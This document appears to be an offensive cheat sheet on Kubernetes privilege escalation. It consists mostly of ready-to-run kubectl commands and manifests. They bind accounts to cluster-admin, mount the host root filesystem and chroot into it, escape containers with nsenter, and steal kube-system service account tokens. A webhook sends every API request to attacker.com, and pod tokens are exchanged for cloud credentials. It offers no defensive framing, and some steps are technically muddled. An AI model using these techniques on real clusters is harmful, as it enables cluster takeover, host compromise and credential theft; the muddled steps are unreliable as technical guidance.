# Kubernetes Privilege Escalation

Techniques for escalating privileges in Kubernetes clusters.

## RBAC Exploitation

### Enumerate Cluster Roles

```bash
# Find all cluster roles
kubectl get clusterroles -o json | jq '.items[] | {name: .metadata.name, rules: .rules}'

# Find dangerous roles
kubectl get clusterroles -o json | jq '.items[] | select(.rules[] | .verbs[] == "*") | .metadata.name'

# Check role bindings
kubectl get clusterrolebindings -o json | jq '.items[] | {name: .metadata.name, roleRef: .roleRef, subjects: .subjects}'

# Find which role is bound to your service account
SA_NAME=$(whoami | cut -d: -f1)
kubectl get clusterrolebindings,rolebindings --all-namespaces -o json | \
  jq '.items[] | select(.subjects[]?.name == "'$SA_NAME'")'

# Get permissions of current service account
kubectl auth can-i --list

# Find service accounts with admin access
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.roleRef.name == "cluster-admin") | .subjects[]'
```

### Exploit ClusterRole with Wildcard Permissions

```bash
# Find roles with * permissions
kubectl get clusterroles -o json | \
  jq '.items[] | select(.rules[] | .verbs[] == "*" or .apiGroups[] == "*") | .metadata.name'

# If you have * permissions:
# - Can perform any action
# - Can access all resources
# - Can modify RBAC

# Example: Role with wildcard
cat > powerful-role.yaml << 'EOF'
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: powerful
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
EOF

# If you can create such roles
kubectl apply -f powerful-role.yaml

# Bind it to your service account
kubectl create clusterrolebinding sa-admin \
  --clusterrole=powerful \
  --serviceaccount=default:default
```

### Bind Existing Admin Role

```bash
# If you can create rolebindings
# Bind yourself to cluster-admin

kubectl create clusterrolebinding my-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=default:default

# Or bind a user
kubectl create clusterrolebinding user-admin \
  --clusterrole=cluster-admin \
  --user=attacker@company.com

# Now you have cluster admin access
# All restrictions removed

# Verify
kubectl auth can-i create clusterroles
kubectl auth can-i delete pods --all-namespaces
```

## Capabilities Exploitation

### Privileged Container Escape

```bash
# Check if running in privileged container
grep -i privileged /proc/self/cgroup

# List capabilities
getcap /bin/sh

# If CAP_SYS_ADMIN present, escape container
# Use nsenter to access host namespace

# Check if nsenter is available
which nsenter

# If not, compile it
apt-get install util-linux

# Access host namespace
nsenter -t 1 -m -u -i /bin/bash

# Now running as root on host
whoami  # Returns root
hostname  # Shows actual node name
```

### Dangerous Capabilities

```bash
# Check container's capabilities
cat /proc/1/status | grep Cap

# Dangerous capabilities:
# - CAP_SYS_ADMIN: Can mount filesystems, use many system calls
# - CAP_NET_ADMIN: Can configure network
# - CAP_SYS_BOOT: Can reboot system
# - CAP_DAC_OVERRIDE: Can bypass permission checks

# If container has CAP_SYS_ADMIN
# Can mount host filesystem
mount -o bind /etc /tmp/etc

# Read host files
cat /tmp/etc/passwd

# Or use cgroups to escape
# Can access host's processes via cgroup
cat /proc/1/cgroup
```

## Volume-based Privilege Escalation

### Host Path Volume Access

```bash
# Check what volumes are mounted
kubectl get pod $POD_NAME -o json | jq '.spec.volumes'

# If hostPath volume is mounted
# You have access to host filesystem

cat /proc/mounts | grep hostPath

# Create pod with host path mount
cat > host-access.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: host-access
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: host-access
    image: ubuntu
    volumeMounts:
    - name: root
      mountPath: /host_root
  volumes:
  - name: root
    hostPath:
      path: /
EOF

kubectl apply -f host-access.yaml
kubectl exec -it host-access -- chroot /host_root /bin/bash

# Now running as host root
# Full system compromise
```

### Secret Volume Abuse

```bash
# If you can mount secrets from other namespaces
# You can steal credentials

cat > cross-ns-secret.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: secret-thief
spec:
  serviceAccountName: default
  containers:
  - name: thief
    image: ubuntu
    volumeMounts:
    - name: admin-secret
      mountPath: /admin-secret
  volumes:
  - name: admin-secret
    secret:
      secretName: admin-token
      namespace: kube-system
EOF

# If RBAC allows reading cross-namespace secrets
kubectl apply -f cross-ns-secret.yaml
kubectl exec -it secret-thief -- cat /admin-secret/token
```

## Service Account Token Escalation

### Impersonate Service Account

```bash
# If you have permission: serviceaccounts/impersonate
# You can act as any service account

kubectl get pod --as=system:serviceaccount:kube-system:admin

# Or in API requests
curl -k https://kubernetes.default/api/v1/pods \
  --header "Impersonate-User: system:serviceaccount:kube-system:admin"

# Check what impersonation you can do
kubectl auth can-i impersonate serviceaccounts
kubectl auth can-i impersonate users
kubectl auth can-i impersonate groups
```

### Extract and Reuse Service Account Token

```bash
# Get any service account token
kubectl get secret {service-account-token-secret} \
  -o jsonpath='{.data.token}' | base64 -d

# Use token to access API
TOKEN=$(kubectl get secret {secret} -o jsonpath='{.data.token}' | base64 -d)

curl -k https://kubernetes.default:443/api/v1/pods \
  -H "Authorization: Bearer $TOKEN"

# If the service account has admin permissions
# You have admin access without kubeconfig
```

## API Abuse

### Unrestricted API Verb Permissions

```bash
# Find service accounts with watch permission
kubectl get clusterroles -o json | \
  jq '.items[] | select(.rules[] | .verbs[] == "watch") | .metadata.name'

# watch permission can observe all changes
# Get complete view of cluster activity

# Find list permission abuse
kubectl get clusterroles -o json | \
  jq '.items[] | select(.rules[] | .verbs[] == "list") | .metadata.name'

# list allows enumerating resources
# Can find all pods, secrets, configmaps

# create and patch abuse
# Can create resources and modify them

# Find roles allowing create deployment
kubectl get clusterroles -o json | \
  jq '.items[] | select(.rules[] | .resources[] == "deployments" and .verbs[] == "create")'

# If you can create deployments
# You can deploy arbitrary workloads
```

## Webhook Configuration Abuse

```bash
# If you can create ValidatingWebhookConfiguration
# You can intercept all API requests

cat > webhook-escalation.yaml << 'EOF'
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: privilege-escalator
webhooks:
- name: escalator.attacker.com
  clientConfig:
    url: http://attacker.com:8080/validate
  rules:
  - operations: ["*"]
    apiGroups: ["*"]
    apiVersions: ["*"]
    resources: ["*"]
  failurePolicy: Ignore
EOF

# Webhook can:
# - Modify requests before they're processed
# - Block legitimate operations
# - Grant yourself admin access
```

## Service to Service Escalation

### Abuse Kubernetes Service Account for Cloud Access

```bash
# From pod, get service account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Use token to access cloud services if configured
# GCP Workload Identity setup

# Exchange Kubernetes token for cloud token
curl -X POST https://sts.googleapis.com/v1/token \
  -H "Content-Type: application/json" \
  -d '{
    "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
    "subject_token": "'${TOKEN}'",
    "subject_token_type": "urn:ietf:params:oauth:token-type:jwt"
  }'

# Now you have cloud access
# Escalate to cloud resources

# Check cloud roles
gcloud projects get-iam-policy {projectId} \
  --flatten="bindings[].members" \
  --filter="bindings.members:serviceAccount:{sa}@{project}.iam.gserviceaccount.com"
```

## Kubelet Privilege Escalation

```bash
# If kubelet is exposed and improperly configured
# You can request privileged pod execution

# Create pod requesting privileged execution
cat > privesc-pod.yaml << 'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: privesc
spec:
  containers:
  - name: container
    image: ubuntu
    securityContext:
      privileged: true
      capabilities:
        add:
        - SYS_ADMIN
        - NET_ADMIN
        - CAP_SYS_MODULE
EOF

# If kubelet doesn't enforce restrictions
kubectl apply -f privesc-pod.yaml

# Container now runs privileged
# Can load kernel modules, modify network, escape to host
```
